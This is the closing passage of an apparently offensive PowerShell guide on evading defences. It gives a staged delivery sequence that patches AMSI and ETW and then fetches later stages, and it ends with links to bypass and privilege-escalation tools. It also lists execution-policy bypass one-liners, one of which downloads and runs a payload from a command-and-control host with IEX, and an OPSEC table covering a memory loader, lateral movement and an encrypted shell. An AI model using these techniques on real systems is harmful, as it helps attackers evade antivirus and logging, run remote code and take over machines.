Script Block Logging (Event ID 4104) operates at the PowerShell engine layer. The ETW patch in Script 1 suppresses ETW providers but SBL writes to the Windows Event Log through a separate code path. The AMSI patch will prevent real-time AV scanning of the content, but SBL may still capture code if it fires before the bypass executes. The correct delivery sequence is:

1. Deliver a minimal, obfuscated stub via `EncodedCommand` that only patches AMSI.
2. Have the stub download and execute Script 1 via `IEX` or `[ScriptBlock]::Create`.
3. Load subsequent stages only after AMSI and ETW are patched.

### Execution Policy Bypass (No Admin Required)

```
powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -File payload.ps1
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand <base64_here>
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')"
```

### OPSEC Summary Table

| Script | Creates Process | Writes Files | Network | Modifies Memory |
|--------|----------------|--------------|---------|-----------------|
| MemoryLoader | No | No | Yes (HTTP) | Yes (AMSI/ETW patch) |
| PrivescCheck | Yes (whoami.exe) | No | No | No |
| WmiLateral | Yes (remote cmd.exe) | Yes (remote, SCM mode) | Yes (DCOM/WinRM) | No |
| EncryptedShell | Yes (cmd.exe) | No | Yes (TCP) | No |

---

## Resources

- [PowerShell Documentation — Microsoft Learn](https://learn.microsoft.com/en-us/powershell/)
- [AMSI Developer Documentation — Microsoft](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [PayloadsAllTheThings — PowerShell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Powershell%20-%20Cheatsheet.md)
- [PowerSploit — PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit)
- [AMSI.fail — Bypass Generator](https://amsi.fail/)
- [ETW Bypass Research — xpn.sec](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [PrivescCheck — itm4n](https://github.com/itm4n/PrivescCheck)
- [Windows Privilege Escalation — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [GodPotato — Potato Attacks](https://github.com/BeichenDream/GodPotato)
